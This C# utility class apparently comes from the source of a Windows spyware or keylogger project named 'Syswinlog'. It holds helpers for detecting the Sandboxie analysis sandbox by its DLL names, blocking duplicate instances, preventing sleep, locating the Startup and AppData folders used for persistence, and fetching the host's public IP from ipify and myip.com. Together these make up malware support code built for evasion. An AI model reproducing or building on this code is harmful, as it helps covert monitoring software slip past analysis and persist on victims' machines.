using System;
using System.Net;
using Syswinlog.Classes.NativeMethods;
using System.Text.RegularExpressions;
using System.Diagnostics;

class Utils
{
    private static string[] hosts = new string[] {
        "https://api.ipify.org?format=json",
        "https://api.myip.com/"
    };
    // ip pattern
    private static Regex pattern = new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b");

    public static bool DetectSandboxie()
    {
        string[] sandboxList = new string[] {
            "cmdvrt32.dll",
            "SxIn.dll",
            "SbieDll.dll"
        };
        foreach ( var sbox in sandboxList ) {
            if( NativeMethods.GetModuleHandle(sbox).ToInt32() != 0 ) {
                return true;
            }
        }
        return false;
    }

    public static bool IsInstanceRunning()
    {
        Process[] procList = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
        if( procList.Length > 1 ) {
            return true;
        } else {
            return false;
        }
    }

    public static void PreventSleep()
    {
        try {
            NativeMethods.SetThreadExecutionState(
                NativeMethods.EXECUTION_STATE.ES_SYSTEM_REQUIRED |
                NativeMethods.EXECUTION_STATE.ES_CONTINUOUS |
                NativeMethods.EXECUTION_STATE.ES_DISPLAY_REQUIRED);
        }
        catch { }
    }

    public static string GetStartupDirectory() {
        return Environment.GetFolderPath(Environment.SpecialFolder.Startup);
    }

    public static string GetAppDataFolder() {
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    }

    public static string GetIP()
    {
        string data = String.Empty;

        foreach ( var host in hosts ) {
            using (var wc = new WebClient()) {
                try {
                    data = wc.DownloadString( host );
                }
                catch (WebException) {
                    
                }

                if( data != String.Empty ) {
                    MatchCollection result = pattern.Matches(data);
                    return result[0].ToString();
                }
            }
        }
        return "";
    }
}
